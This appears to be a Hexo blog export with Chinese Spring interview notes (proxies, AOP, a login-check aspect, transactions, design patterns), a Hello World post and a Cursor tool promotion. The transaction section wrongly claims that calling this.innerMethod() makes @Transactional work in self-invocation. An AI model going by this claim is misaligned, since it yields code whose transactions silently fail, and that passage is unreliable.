title="JDK动态代理"></a>JDK动态代理</h3><p>(一）实现原理</p><p>JDK的动态代理是基于反射实现。JDK通过反射，生成一个代理类，这个代理类实现了原来那个类的全部接口，并对接口中定义的所有方法进行了代理。当我们通过代理对象执行原来那个类的方法时，代理类底层会通过反射机制，回调我们实现的InvocationHandler接口的invoke方法。并且这个代理类是Proxy类的子类（记住这个结论，后面测试要用）。这就是JDK动态代理大致的实现方式。</p><p>（二）优点</p><p>JDK动态代理是JDK原生的，不需要任何依赖即可使用；</p><p>通过反射机制生成代理类的速度要比CGLib操作字节码生成代理类的速度更快；</p><p>（三）缺点</p><p>如果要使用JDK动态代理，被代理的类必须实现了接口，否则无法代理；</p><p>JDK动态代理无法为没有在接口中定义的方法实现代理，假设我们有一个实现了接口的类，我们为它的一个不属于接口中的方法配置了切面，Spring仍然会使用JDK的动态代理，但是由于配置了切面的方法不属于接口，为这个方法配置的切面将不会被织入。</p><p>JDK动态代理执行代理方法时，需要通过反射机制进行回调，此时方法执行的效率比较低；</p><h3 id="CGLib动态代理"><a href="#CGLib动态代理" class="headerlink" title="CGLib动态代理"></a>CGLib动态代理</h3><p>（一）实现原理</p><p>CGLib实现动态代理的原理是，底层采用了ASM字节码生成框架，直接对需要代理的类的字节码进行操作，生成这个类的一个子类，并重写了类的所有可以重写的方法，在重写的过程中，将我们定义的额外的逻辑（简单理解为Spring中的切面）织入到方法中，对方法进行了增强。而通过字节码操作生成的代理类，和我们自己编写并编译后的类没有太大区别。</p><p>（二）优点</p><p>使用CGLib代理的类，不需要实现接口，因为CGLib生成的代理类是直接继承自需要被代理的类；</p><p>CGLib生成的代理类是原来那个类的子类，这就意味着这个代理类可以为原来那个类中，所有能够被子类重写的方法进行代理；</p><p>CGLib生成的代理类，和我们自己编写并编译的类没有太大区别，对方法的调用和直接调用普通类的方式一致，所以CGLib执行代理方法的效率要高于JDK的动态代理；</p><p>（三）缺点</p><p>由于CGLib的代理类使用的是继承，这也就意味着如果需要被代理的类是一个final类，则无法使用CGLib代理；</p><p>由于CGLib实现代理方法的方式是重写父类的方法，所以无法对final方法，或者private方法进行代理，因为子类无法重写这些方法；</p><p>CGLib生成代理类的方式是通过操作字节码，这种方式生成代理类的速度要比JDK通过反射生成代理类的速度更慢；</p><h3 id="AOP术语"><a href="#AOP术语" class="headerlink" title="AOP术语"></a>AOP术语</h3><h4 id="连接点-Join-point"><a href="#连接点-Join-point" class="headerlink" title="连接点(Join point)"></a>连接点(Join point)</h4><p>能够被拦截的地方</p><h4 id="切点-Poincut"><a href="#切点-Poincut" class="headerlink" title="切点(Poincut)"></a>切点(Poincut)</h4><p>具体定位的连接点</p><h4 id="增强-通知-Advice"><a href="#增强-通知-Advice" class="headerlink" title="增强&#x2F;通知(Advice)"></a>增强&#x2F;通知(Advice)</h4><p>表示添加到切点的一段逻辑代码，并定位连接点的方位信息</p><h4 id="织入-Weaving"><a href="#织入-Weaving" class="headerlink" title="织入(Weaving)"></a>织入(Weaving)</h4><p>将增强&#x2F;通知添加到目标类的具体连接点上的过程。</p><h4 id="引入-引介-Introduction"><a href="#引入-引介-Introduction" class="headerlink" title="引入&#x2F;引介(Introduction)"></a>引入&#x2F;引介(Introduction)</h4><p>允许我们向现有的类添加新方法或属性。是一种特殊的增强！</p><h4 id="切面-Aspect"><a href="#切面-Aspect" class="headerlink" title="切面(Aspect)"></a>切面(Aspect)</h4><p>切面由切点和增强&#x2F;通知组成，它既包括了横切逻辑的定义、也包括了连接点的定义</p><h3 id="Spring对AOP的支持"><a href="#Spring对AOP的支持" class="headerlink" title="Spring对AOP的支持"></a>Spring对AOP的支持</h3><ul><li>基于代理的经典SpringAOP：需要实现接口，手动创建代理</li><li>纯POJO切面：使用XML配置，aop命名空间</li><li>@AspectJ注解驱动的切面：使用注解的方式，这是最简洁和最方便的！</li></ul><h2 id="怎么定义一个注解"><a href="#怎么定义一个注解" class="headerlink" title="怎么定义一个注解"></a>怎么定义一个注解</h2><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="定义注解"><a href="#定义注解" class="headerlink" title="定义注解"></a>定义注解</h3><h4 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h4><p>java.lang.annotation 提供了四种元注解，专门注解其他的注解（在自定义注解的时候，需要使用到元注解）：</p><ul><li>@Documented – 注解是否将包含在JavaDoc中</li><li>@Retention – 什么时候使用该注解</li><li>@Target – 注解用于什么地方</li><li>@Inherited – 是否允许子类继承该注解</li></ul><h5 id="Retention"><a href="#Retention" class="headerlink" title="@Retention"></a>@Retention</h5><p>定义该注解的生命周期</p><ul><li>RetentionPolicy.SOURCE : 在编译阶段丢弃。这些注解在编译结束之后就不再有任何意义，所以它们不会写入字节码。@Override, @SuppressWarnings都属于这类注解。</li><li>RetentionPolicy.CLASS : 在类加载的时候丢弃。在字节码文件的处理中有用。注解默认使用这种方式</li><li>RetentionPolicy.RUNTIME : 始终不会丢弃，运行期也保留该注解，因此可以使用反射机制读取该注解的信息。我们自定义的注解通常使用这种方式。</li></ul><h5 id="Target"><a href="#Target" class="headerlink" title="@Target"></a>@Target</h5><p>表示该注解用于什么地方。默认值为任何元素，表示该注解用于什么地方。可用的ElementType 参数包括</p><ul><li>ElementType.CONSTRUCTOR: 用于描述构造器</li><li>ElementType.FIELD: 成员变量、对象、属性（包括enum实例）</li><li>ElementType.LOCAL_VARIABLE: 用于描述局部变量</li><li>ElementType.METHOD: 用于描述方法</li><li>ElementType.PACKAGE: 用于描述包</li><li>ElementType.PARAMETER: 用于描述参数</li><li>ElementType.TYPE: 用于描述类、接口(包括注解类型) 或enum声明</li></ul><h5 id="Documented"><a href="#Documented" class="headerlink" title="@Documented"></a>@Documented</h5><p>一个简单的Annotations 标记注解，表示是否将注解信息添加在java文档中。</p><h5 id="Inherited"><a href="#Inherited" class="headerlink" title="@Inherited"></a>@Inherited</h5><p>定义该注释和子类的关系</p><p>@Inherited 元注解是一个标记注解，@Inherited 阐述了某个被标注的类型是被继承的。如果一个使用了@Inherited 修饰的annotation 类型被用于一个class，则这个annotation 将被用于该class<br>的子类。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>自定义一个检查是否登录的注解</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CheckLogin &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Order(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CheckLoginAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before(&quot;execution(* *..controller..*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        <span class="type">MethodSignature</span> <span class="variable">signature</span> <span class="operator">=</span> (MethodSignature) joinPoint.getSignature();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> signature.getMethod();</span><br><span class="line">        <span class="type">CheckLogin</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(CheckLogin.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//获取类上注解</span></span><br><span class="line">            annotation = joinPoint.getTarget().getClass().getAnnotation(CheckLogin.class);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//获取到请求的属性</span></span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span></span><br><span class="line">                    (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="comment">//获取到请求对象</span></span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">ssoToken</span> <span class="operator">=</span> HttpUtil.getSsoToken(request);</span><br><span class="line">            <span class="keyword">if</span> (ssoToken != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">loginUserTokenKey</span> <span class="operator">=</span> AuthRedisKeyUtil.getLoginUserTokenKey(ssoToken);</span><br><span class="line">                <span class="keyword">if</span> (redisTemplate.hasKey(loginUserTokenKey)) &#123;</span><br><span class="line">                    <span class="comment">//通过</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LoginException</span>(<span class="string">&quot;登录已过期&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalRequestException</span>(<span class="string">&quot;非法请求&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccountController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CheckLogin</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/query&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> JSONObject <span class="title function_">queryRegulation</span><span class="params">(Integer pageNum, Integer pageSize)</span> &#123;</span><br><span class="line">        <span class="comment">//....业务逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="Spring-支持两种方式的事务管理"><a href="#Spring-支持两种方式的事务管理" class="headerlink" title="Spring 支持两种方式的事务管理"></a>Spring 支持两种方式的事务管理</h3><h4 id="1、编程式事务管理"><a href="#1、编程式事务管理" class="headerlink" title="1、编程式事务管理"></a>1、编程式事务管理</h4><ul><li>TransactionTemplate</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> TransactionTemplate transactionTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testTransaction</span><span class="params">()</span>&#123;</span><br><span class="line">    transactionTemplate.execute(<span class="keyword">new</span> <span class="title class_">TransactionCallbackWithoutResult</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doInTransactionWithoutResult</span><span class="params">(TransactionStatus status)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">//...业务代码</span></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    status.setRollbackOnly();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>TransactionManager</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> PlatformTransactionManager transactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testTransaction2</span><span class="params">()</span>&#123;</span><br><span class="line">        TransactionStatus status=transactionManager.getTransaction(<span class="keyword">new</span> <span class="title class_">DefaultTransactionDefinition</span>());</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//...业务代码</span></span><br><span class="line">            transactionManager.commit(status);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            transactionManager.rollback(status);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、注解"><a href="#2、注解" class="headerlink" title="2、注解"></a>2、注解</h4><ul><li>@Transactional</li></ul><h3 id="事务的传播性-Propagation"><a href="#事务的传播性-Propagation" class="headerlink" title="事务的传播性 Propagation"></a>事务的传播性 Propagation</h3><p>① PROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就加入该事务，该设置是最常用的设置。</p><p>② PROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事务执行。</p><p>③ PROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就抛出异常。</p><p>④ PROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。</p><p>⑤ PROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。</p><p>⑥ PROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。</p><p>⑦ PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则按REQUIRED属性执行。</p><h3 id="spring事务失效的场景"><a href="#spring事务失效的场景" class="headerlink" title="spring事务失效的场景"></a>spring事务失效的场景</h3><ol><li><p>非被Spring管理的Bean上的事务： 如果你在一个非被Spring容器管理的Bean（例如通过new关键字直接创建的对象）上使用事务注解，事务将不会生效。Spring的事务管理是基于AOP（面向切面编程）实现的，因此只能在由Spring容器管理的Bean上起作用。</p></li><li><p>未捕获的异常： 如果在事务内发生未捕获的运行时异常，事务将回滚。但是，如果异常被捕获并在方法内处理，事务可能不会回滚。确保在事务边界内处理异常或者允许异常传播到事务管理器以便正确回滚。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transactionalMethod</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// some code that may throw an exception</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// handle the exception (not recommended within a transaction)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>嵌套事务问题： Spring事务支持嵌套事务，但是嵌套事务的行为取决于底层事务管理器的支持。如果使用的事务管理器不支持嵌套事务，嵌套事务可能会被忽略，导致事务行为不一致。</p></li><li><p>方法调用问题： Spring事务是通过AOP实现的，它依赖于代理对象来拦截方法调用并处理事务。如果你在同一个类内部调用一个带有事务注解的方法，事务可能不会起作用，因为代理对象无法拦截内部方法的调用。确保事务注解生效，要么调用方法是通过代理对象，要么通过self-invocation，例如通过this关键字。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">outerMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        innerMethod(); <span class="comment">// Transactional annotation may not work here</span></span><br><span class="line">        <span class="built_in">this</span>.innerMethod(); <span class="comment">// Transactional annotation should work here</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">innerMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// some transactional logic</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>异步方法问题： 如果使用了异步方法（通过@Async注解），事务可能会失效。在异步方法内，事务上下文可能无法正确传播，导致事务不起作用。要在异步方法中使用事务，可以使用TransactionContext传播方式。</p></li></ol><h2 id="spring使用的设计模式"><a href="#spring使用的设计模式" class="headerlink" title="spring使用的设计模式"></a>spring使用的设计模式</h2><h3 id="简单工厂"><a href="#简单工厂" class="headerlink" title="简单工厂"></a>简单工厂</h3><p><strong>实现方式：</strong></p><p>BeanFactory。Spring中的BeanFactory就是简单工厂模式的体现，根据传入一个唯一的标识来获得Bean对象，但是否是在传入参数后创建还是传入参数前创建这个要根据具体情况来定。</p><p><strong>实现原理：</strong></p><p>bean容器的启动阶段：</p><p>读取bean的xml配置文件,将bean元素分别转换成一个BeanDefinition对象。<br>然后通过BeanDefinitionRegistry将这些bean注册到beanFactory中，保存在它的一个ConcurrentHashMap中。<br>将BeanDefinition注册到了beanFactory之后，在这里Spring为我们提供了一个扩展的切口，允许我们通过实现接口BeanFactoryPostProcessor<br>在此处来插入我们定义的代码。典型的例子就是：PropertyPlaceholderConfigurer，我们一般在配置数据库的dataSource时使用到的占位符的值，就是它注入进去的。</p><p>容器中bean的实例化阶段：</p><p>实例化阶段主要是通过反射或者CGLIB对bean进行实例化，在这个阶段Spring又给我们暴露了很多的扩展点：</p><p>各种的Aware接口 ，比如 BeanFactoryAware，对于实现了这些Aware接口的bean，在实例化bean时Spring会帮我们注入对应的BeanFactory的实例。 BeanPostProcessor接口<br>，实现了BeanPostProcessor接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 InitializingBean接口<br>，实现了InitializingBean接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 DisposableBean接口<br>，实现了DisposableBean接口的bean，在该bean死亡时Spring会帮我们调用接口中的方法。</p><p><strong>设计意义：</strong></p><p>松耦合。<br>可以将原来硬编码的依赖，通过Spring这个beanFactory这个工厂来注入依赖，也就是说原来只有依赖方和被依赖方，现在我们引入了第三方——spring这个beanFactory，由它来解决bean之间的依赖问题，达到了松耦合的效果.</p><p>bean的额外处理。 通过Spring接口的暴露，在实例化bean的阶段我们可以进行一些额外的处理，这些额外的处理只需要让bean实现对应的接口即可，那么spring就会在bean的生命周期调用我们实现的接口来处理该bean。[非常重要]</p><h3 id="工厂方法"><a href="#工厂方法" class="headerlink" title="工厂方法"></a>工厂方法</h3><p><strong>实现方式：</strong></p><p>FactoryBean接口。</p><p><strong>实现原理：</strong></p><p>实现了FactoryBean接口的bean是一类叫做factory的bean。其特点是，spring会在使用getBean()调用获得该bean时，会自动调用该bean的getObject()<br>方法，所以返回的不是factory这个bean，而是这个bean.getOjbect()方法的返回值。</p><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>Spring依赖注入Bean实例默认是单例的。</p><p>Spring的依赖注入（包括lazy-init方式）都是发生在AbstractBeanFactory的getBean里。getBean的doGetBean方法调用getSingleton进行bean的创建。</p><h3 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h3><p><strong>实现方式：</strong></p><p>SpringMVC中的适配器HandlerAdatper。</p><p><strong>实现原理：</strong></p><p>HandlerAdatper根据Handler规则执行不同的Handler。</p><p><strong>实现过程：</strong></p><p>DispatcherServlet根据HandlerMapping返回的handler，向HandlerAdatper发起请求，处理Handler。</p><p>HandlerAdapter根据规则找到对应的Handler并让其执行，执行完毕后Handler会向HandlerAdapter返回一个ModelAndView，最后由HandlerAdapter向DispatchServelet返回一个ModelAndView。</p><h3 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h3><p><strong>实现方式：</strong></p><p>Spring中用到的包装器模式在类名上有两种表现：一种是类名中含有Wrapper，另一种是类名中含有Decorator。</p><p><strong>实质：</strong></p><p>动态地给一个对象添加一些额外的职责。</p><p>就增加功能来说，Decorator模式相比生成子类更为灵活。</p><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p><strong>实现方式：</strong></p><p>AOP底层，就是动态代理模式的实现。</p><p><strong>动态代理：</strong></p><p>在内存中构建的，不需要手动编写代理类</p><h2 id="spring中properties和yml的加载顺序"><a href="#spring中properties和yml的加载顺序" class="headerlink" title="spring中properties和yml的加载顺序"></a>spring中properties和yml的加载顺序</h2><p>相同内容properties和yml的加载顺序是properties优先</p><h2 id="使用-Autowired注解自动装配的过程是怎样的？"><a href="#使用-Autowired注解自动装配的过程是怎样的？" class="headerlink" title="使用@Autowired注解自动装配的过程是怎样的？"></a>使用@Autowired注解自动装配的过程是怎样的？</h2><p>使用@Autowired注解来自动装配指定的bean。在使用@Autowired注解之前需要在Spring配置文件进行配置，&lt;context:annotation-config &#x2F;&gt;。</p><p>在启动spring<br>IoC时，容器自动装载了一个AutowiredAnnotationBeanPostProcessor后置处理器，当容器扫描到@Autowied、@Resource或@Inject时，就会在IoC容器自动查找需要的bean，并装配给该对象的属性。在使用@Autowired时，首先在容器中查询对应类型的bean：</p><ul><li>如果查询结果刚好为一个，就将该bean装配给@Autowired指定的数据；</li><li>如果查询的结果不止一个，那么@Autowired会根据名称来查找；</li><li>如果上述查找的结果为空，那么会抛出异常。解决方法是，使用required&#x3D;false。</li></ul><h2 id="Autowired和-Resource之间的区别"><a href="#Autowired和-Resource之间的区别" class="headerlink" title="@Autowired和@Resource之间的区别"></a>@Autowired和@Resource之间的区别</h2><p>@Autowired可用于：构造函数、成员变量、Setter方法</p><p>@Autowired和@Resource之间的区别</p><ul><li>@Autowired默认是按照类型装配注入的，默认情况下它要求依赖对象必须存在（可以设置它required属性为false）。</li><li>@Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入。</li></ul><h2 id="Spring中BeanFactory与FactoryBean的区别"><a href="#Spring中BeanFactory与FactoryBean的区别" class="headerlink" title="Spring中BeanFactory与FactoryBean的区别"></a>Spring中BeanFactory与FactoryBean的区别</h2><h3 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h3><p>BeanFactory是一个接口，它是Spring中工厂的顶层规范，是SpringIoc容器的核心接口，它定义了getBean()、containsBean()等管理Bean的通用方法。Spring的容器都是它的具体实现如：</p><ul><li>DefaultListableBeanFactory</li><li>XmlBeanFactory</li><li>ApplicationContext</li></ul><p>这些实现类又从不同的维度分别有不同的扩展。</p><h3 id="FactoryBean"><a href="#FactoryBean" class="headerlink" title="FactoryBean"></a>FactoryBean</h3><p>首先它是一个Bean，但又不仅仅是一个Bean。它是一个能生产或修饰对象生成的工厂Bean，类似于设计模式中的工厂模式和装饰器模式。它能在需要的时候生产一个对象，且不仅仅限于它自身，它能返回任何Bean的实例。</p><p>FactoryBean表现的是一个工厂的职责。 即一个Bean A如果实现了FactoryBean接口，那么A就变成了一个工厂，根据A的名称获取到的实际上是工厂调用getObject()<br>返回的对象，而不是A本身，如果要获取工厂A自身的实例，那么需要在名称前面加上’&amp;’符号。</p><ul><li>getObject(‘name’)返回工厂中的实例</li><li>getObject(‘&amp;name’)返回工厂本身的实例</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Hello World</title>
      
      <link href="/2024/05/26/hello-world/"/>
      <url>/2024/05/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      
        <title>写代码神器</title>
      
      <link href="/2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/"/>
      <url>/2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>Cursor是一个基于人工智能的编程辅助工具，它可以帮助你快速地生成、修改、优化和测试代码。Cursor使用了最先进的自然语言处理技术，能够理解你的编程意图和需求，并根据你的上下文和目标，生成符合你期望的代码。Cursor不仅可以生成代码，还可以检测和修复代码中的错误，提高代码的质量和效率。Cursor还可以根据你的代码生成相应的文档、注释和测试用例，让你的编程过程更加轻松和高效。</p><p><img src="/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/1.png" alt="首页"></p><p>Cursor的用途和优势</p><p>Cursor可以应用于多种编程场景和语言，无论你是一个新手还是一个专家，Cursor都可以为你提供强大的编程支持。Cursor的主要用途和优势有：</p><p>代码生成：Cursor可以根据你的自然语言描述或者部分代码，生成完整的代码片段或者函数。你可以使用Cursor来快速实现你的编程想法，或者填补你的代码空缺。Cursor支持多种编程语言，如Python, Java, C++, JavaScript等，你可以根据你的需要选择合适的语言。</p><p>代码修改：Cursor可以根据你的修改意图和需求，对你的代码进行修改和优化。你可以使用Cursor来修改你的代码逻辑、参数、变量名等，或者对你的代码进行重构、简化和美化。Cursor可以保证修改后的代码的正确性和一致性，避免引入新的错误。</p><p>代码测试：Cursor可以根据你的代码，生成相应的测试用例和测试代码。你可以使用Cursor来测试你的代码的功能、性能、安全性等，或者对你的代码进行覆盖率、静态分析等检查。Cursor可以帮助你提高你的代码的可靠性和稳定性，发现和解决潜在的问题。</p><p>代码文档：Cursor可以根据你的代码，生成相应的文档和注释。你可以使用Cursor来生成你的代码的说明、用法、参数、返回值等，或者对你的代码添加有意义的注释。Cursor可以帮助你提高你的代码的可读性和可维护性，方便你和他人理解和使用你的代码。</p><p><img src="/./2024/05/26/%E5%86%99%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8/2.png" alt="编辑页"></p><p>Cursor的使用方法</p><p>Cursor的使用方法非常简单和方便，你只需要在你的编程环境中安装Cursor的插件，然后就可以通过自然语言或者部分代码来引导Cursor为你生成、修改、测试或者文档化你的代码。Cursor的使用方法如下：</p><p>代码生成：你可以在你的代码编辑器中输入你的自然语言描述或者部分代码，然后按下Ctrl+Enter键，Cursor就会为你生成相应的代码。例如，你可以输入“定义一个Python函数，计算两个数的最大公约数”，然后按下Ctrl+Enter键，Cursor就会为你生成如下的代码：</p><p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p><p>def gcd(a, b):</p><h1 id="使用辗转相除法计算两个数的最大公约数"><a href="#使用辗转相除法计算两个数的最大公约数" class="headerlink" title="使用辗转相除法计算两个数的最大公约数"></a>使用辗转相除法计算两个数的最大公约数</h1><p>while b !&#x3D; 0:<br>a, b &#x3D; b, a % b<br>return a<br>代码修改：你可以在你的代码编辑器中选中你想要修改的代码，然后输入你的修改意图或者需求，然后按下Ctrl+Enter键，Cursor就会为你修改相应的代码。例如，你可以选中上面的代码，然后输入“使用递归的方式实现”，然后按下Ctrl+Enter键，Cursor就会为你修改如下的代码：</p><p>Python<br>AI 生成的代码。仔细查看和使用。 有关常见问题解答的详细信息.</p><p>def gcd(a, b):</p><h1 id="使用递归的方式计算两个数的最大公约数"><a href="#使用递归的方式计算两个数的最大公约数" class="headerlink" title="使用递归的方式计算两个数的最大公约数"></a>使用递归的方式计算两个数的最大公约数</h1><p>if b &#x3D;&#x3D; 0:<br>return a<br>else:<br>return gcd(b, a % 